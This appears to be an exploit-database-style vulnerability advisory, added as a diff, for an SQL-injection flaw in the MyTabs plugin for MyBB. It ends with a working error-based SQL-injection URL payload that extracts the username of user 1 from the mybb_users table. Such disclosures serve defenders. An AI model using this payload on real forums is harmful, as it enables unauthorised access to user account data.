@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/48952/info
+
+The MyTabs plugin for MyBB is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database. 
+
+
+http://www.example.com/mybbpath/index.php?tab=1' and(select 1 from(select count(*),concat((select username from mybb_users where uid=1),floor(Rand(0)*2))a from information_schema.tables group by a)b)-- - 
